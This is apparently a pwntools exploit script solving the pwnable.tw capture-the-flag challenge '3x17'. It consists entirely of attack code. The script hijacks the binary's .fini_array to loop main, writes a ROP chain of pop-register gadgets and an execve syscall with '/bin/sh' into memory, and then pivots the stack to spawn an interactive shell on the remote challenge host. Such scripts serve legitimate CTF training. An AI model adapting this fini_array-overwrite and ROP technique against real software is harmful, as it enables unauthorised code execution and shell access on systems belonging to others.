#!/usr/bin/env python3

from pwn import *

def start():
    global p
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10105)
    else:
        p = elf.process()

context(os="linux") 
context.binary = elf = ELF("./3x17")
#context.log_level = "debug"
start()


main = 0x401b6d
fini = 0x402960
fini_array = 0x4b40f0
syscall = 0x04022b4

pop_rdi = 0x0401696
pop_rdx = 0x0406c30
pop_rsi = 0x0446e35
pop_rax = 0x041e4af
leave_ret = 0x0401c4b

def send(addr, data):
    p.sendlineafter(b"addr:", str(addr))
    p.sendafter(b"data:", data)

send(fini_array, p64(fini) + p64(main))
send(fini_array+16, p64(pop_rdi) + p64(fini_array + 11*8))
send(fini_array+32, p64(pop_rdx) + p64(0))
send(fini_array+48, p64(pop_rsi) + p64(0))
send(fini_array+64, p64(pop_rax) + p64(0x3b))
send(fini_array+80, p64(syscall) + b"/bin/sh\x00")
send(fini_array, p64(leave_ret))

p.interactive()
